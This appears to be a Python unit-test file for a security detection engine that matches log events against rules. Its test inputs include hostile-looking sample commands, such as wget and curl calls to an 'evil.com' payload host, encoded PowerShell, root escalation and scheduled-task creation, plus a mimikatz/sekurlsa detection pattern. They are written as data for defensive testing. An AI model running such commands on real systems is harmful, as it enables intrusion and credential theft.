"""Tests for the detection engine and rule loader."""

from __future__ import annotations

from app.pipeline.detect.engine import _match_condition, _rule_matches
from app.schemas.rule import Rule, RuleCondition


def make_rule(op: str, field: str, value: str, logic: str = "all", **kwargs) -> Rule:
    return Rule(
        rule_id="TEST-001",
        name="Test Rule",
        technique_id="T1059",
        tactic="Execution",
        conditions=[RuleCondition(field=field, op=op, value=value)],
        logic=logic,
        **kwargs,
    )


class TestConditionMatching:
    def test_eq_match(self):
        cond = RuleCondition(field="process_name", op="eq", value="powershell.exe")
        assert _match_condition(cond, {"process_name": "powershell.exe"})

    def test_eq_no_match(self):
        cond = RuleCondition(field="process_name", op="eq", value="powershell.exe")
        assert not _match_condition(cond, {"process_name": "cmd.exe"})

    def test_contains_case_insensitive(self):
        cond = RuleCondition(field="cmd", op="contains", value="-encodedcommand")
        assert _match_condition(cond, {"cmd": "powershell -EncodedCommand abc"})

    def test_startswith(self):
        cond = RuleCondition(field="cmd", op="startswith", value="sudo")
        assert _match_condition(cond, {"cmd": "sudo su - root"})
        assert not _match_condition(cond, {"cmd": "ls sudo"})

    def test_endswith(self):
        cond = RuleCondition(field="file_path", op="endswith", value=".encrypted")
        assert _match_condition(cond, {"file_path": "/data/file.encrypted"})

    def test_regex(self):
        cond = RuleCondition(field="cmd", op="regex", value=r"mimikatz|sekurlsa")
        assert _match_condition(cond, {"cmd": "invoke-expression (mimikatz)"})

    def test_regex_bad_pattern(self):
        cond = RuleCondition(field="cmd", op="regex", value="[invalid")
        assert not _match_condition(cond, {"cmd": "anything"})

    def test_unknown_op_returns_false(self):
        cond = RuleCondition(field="cmd", op="unknown_op", value="x")
        assert not _match_condition(cond, {"cmd": "x"})

    def test_missing_field_does_not_crash(self):
        cond = RuleCondition(field="nonexistent_field", op="eq", value="val")
        assert not _match_condition(cond, {"cmd": "something"})


class TestRuleMatching:
    def test_all_logic_requires_all(self):
        rule = Rule(
            rule_id="R1", name="r1", technique_id="T1", tactic="Execution",
            conditions=[
                RuleCondition(field="process_name", op="eq", value="schtasks.exe"),
                RuleCondition(field="cmd", op="contains", value="/create"),
            ],
            logic="all",
        )
        # Both present
        assert _rule_matches(rule, {"process_name": "schtasks.exe", "cmd": "schtasks /create /tn test"})
        # Only one
        assert not _rule_matches(rule, {"process_name": "schtasks.exe", "cmd": "schtasks /delete"})

    def test_any_logic_requires_one(self):
        rule = Rule(
            rule_id="R2", name="r2", technique_id="T1", tactic="Execution",
            conditions=[
                RuleCondition(field="cmd", op="contains", value="curl"),
                RuleCondition(field="cmd", op="contains", value="wget"),
            ],
            logic="any",
        )
        assert _rule_matches(rule, {"cmd": "wget http://evil.com/payload"})
        assert _rule_matches(rule, {"cmd": "curl -s http://evil.com"})
        assert not _rule_matches(rule, {"cmd": "ls -la"})

    def test_disabled_rule_never_fires(self):
        rule = Rule(
            rule_id="R3", name="r3", technique_id="T1", tactic="Execution",
            conditions=[RuleCondition(field="cmd", op="contains", value="whoami")],
            enabled=False,
        )
        assert not _rule_matches(rule, {"cmd": "whoami"})

    def test_log_format_filter(self):
        rule = Rule(
            rule_id="R4", name="r4", technique_id="T1", tactic="Execution",
            conditions=[RuleCondition(field="cmd", op="contains", value="whoami")],
            log_formats=["syslog"],
        )
        assert _rule_matches(rule, {"log_format": "syslog", "cmd": "whoami"})
        assert not _rule_matches(rule, {"log_format": "json", "cmd": "whoami"})

    def test_empty_conditions_no_match(self):
        rule = Rule(
            rule_id="R5", name="r5", technique_id="T1", tactic="Execution",
            conditions=[],
        )
        assert not _rule_matches(rule, {"cmd": "anything"})

